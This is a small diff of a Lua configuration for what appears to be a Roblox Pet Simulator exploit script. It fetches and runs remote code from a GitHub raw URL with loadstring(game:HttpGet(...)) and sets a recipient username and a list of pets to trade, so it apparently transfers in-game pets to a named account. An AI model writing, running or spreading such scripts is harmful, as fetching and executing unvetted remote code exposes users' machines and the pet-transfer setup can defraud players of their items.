@@ -4,7 +4,7 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/fdvll/pet-simulator-9
 if game.PlaceId == 8737899170 then
     Username = "REyifpof"
     getgenv().PetToTrade = {
-        Pet = "Hacked Computer", Patern = all, DecrementBy = 0
+        {Pet = "Hacked Computer", Patern = all, DecrementBy = 0}
         --{Pet = "Pineapple Monkey", Patern = 2}
 
 
